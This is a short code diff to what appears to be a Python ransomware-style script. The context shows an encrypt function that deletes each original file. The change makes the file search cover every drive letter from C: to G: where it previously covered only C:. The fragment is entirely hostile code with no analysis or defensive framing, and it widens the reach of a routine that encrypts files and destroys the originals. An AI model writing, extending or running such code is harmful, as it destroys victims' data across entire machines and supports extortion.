@@ -314,4 +314,6 @@ def encrypt(file):
     os.remove(file)
 
 
-search_file("C:/")
+rootdir_ = ['C:/', 'D:/', 'E:/', 'F:/', 'G:/']
+for _root in rootdir_:
+    search_file(_root)
